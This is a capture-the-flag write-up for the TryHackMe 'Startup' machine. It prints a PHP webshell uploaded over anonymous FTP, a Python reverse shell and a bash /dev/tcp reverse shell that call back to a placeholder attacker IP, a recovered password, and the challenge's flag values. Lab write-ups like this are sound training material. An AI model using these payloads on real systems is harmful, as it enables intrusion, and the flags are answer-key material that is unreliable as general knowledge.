# Startup — TryHackMe

**Difficulty:** Easy  
**Category:** Linux / Web / Network  
**Date:** 03/06/2026  
**Status:** ✅ Completed

---

## 📋 Table of Contents

- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

> Goal: identify the attack surface of the machine.

```bash
nmap -sC -sV -oN scan.txt <IP>
```

**Open ports found:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |

**Initial observations:**
- FTP anonymous login enabled
- `ftp/` directory with write permissions (`rwxrwxrwx`)
- Two files exposed: `important.jpg` and `notice.txt`
- Web page titled "Maintenance"

---

## 📡 Enumeration

> Goal: extract as much information as possible from the discovered services.

### FTP — Anonymous Login

```bash
ftp <IP>
# Name: anonymous
# Password: (empty enter)
```

Files found:
- `important.jpg` — no relevant information
- `notice.txt` — internal message mentioning user **Maya**

### Web

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

**Relevant findings:**

| Directory | Status |
|-----------|--------|
| `/files/` | 301 → accessible |

Confirmed in browser: `/files/ftp/` exposes the FTP folder contents — the writable FTP directory is served directly by the web server.

---

## 💥 Exploitation

> Goal: gain initial access to the machine.

**Vulnerability found:** FTP anonymous login + writable directory exposed via HTTP → Remote Code Execution (RCE)

**Tools used:** FTP + PHP webshell + Netcat

### Step 1 — Create the PHP shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Step 2 — Upload via FTP

```bash
ftp <IP>
# Name: anonymous
cd ftp
put shell.php
```

### Step 3 — Verify RCE

```
http://<IP>/files/ftp/shell.php?cmd=whoami
```

Output: `www-data` ✅

### Step 4 — Reverse shell

Listener on Kali:
```bash
nc -lvnp 4444
```

Payload via browser:
```
http://<IP>/files/ftp/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_LINUX(IP)",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Step 5 — Upgrade the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Result:** Shell obtained as `www-data` ✅

---

## ⬆️ Privilege Escalation

> Goal: escalate privileges to root/Administrator.

### Stage 1 — www-data → lennie

While exploring the system, a network capture file was found:

```bash
ls /incidents
# suspicious.pcapng
```

Copied to the web directory and downloaded for Wireshark analysis:

```bash
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/sus.pcapng
```

In Wireshark: **Edit → Find Packet → Packet bytes → "lennie"**

Following the TCP Stream revealed a session where the user typed their password while attempting `sudo`:

```
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```

SSH login using the discovered credentials:

```bash
ssh lennie@<THM_IP_MACHINE>
# password: c4ntg3t3n0ughsp1c3
```

### Stage 2 — lennie → root

Script found in lennie's home directory:

```bash
ls /home/lennie/scripts
# planner.sh  startup_list.txt
```

Contents of `planner.sh` (executed by root via cron):

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The script calls `/etc/print.sh`, which is owned by `lennie` and writable:

```bash
ls -la /etc/print.sh
# -rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

**Escalation vector:** writable script owned by lennie, called by a cron job running as root.

Injected reverse shell into the file:

```bash
echo "bash -i >& /dev/tcp/YOUR_IP/5555 0>&1" >> /etc/print.sh
```

Listener on Kali:

```bash
nc -lvnp 5555
```

Waited for cron to execute (~1 minute).

**Result:** Shell obtained as `root` ✅

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| user.txt | /home/lennie/user.txt | `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}` |
| root.txt | /root/root.txt | `THM{f963aaa6a430f210222158ae15c3d76d}` |

**Bonus — Secret spicy soup recipe:** `love` (found in `/recipe.txt`)

---

## 📚 Lessons Learned

1. **FTP anonymous login + writable directory + web server = RCE** — always check whether files uploaded via FTP are accessible through the web server
2. **Network captures can contain plaintext credentials** — `.pcap` and `.pcapng` files should be analysed in Wireshark using Follow TCP Stream
3. **Scripts called by cron with write permissions are privesc vectors** — always check the ownership of scripts executed as root

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `ftp`
- `netcat (nc)`
- `Wireshark`
- `python3` (pty spawn)

---

*Writeup by [GabrielMachado0]*
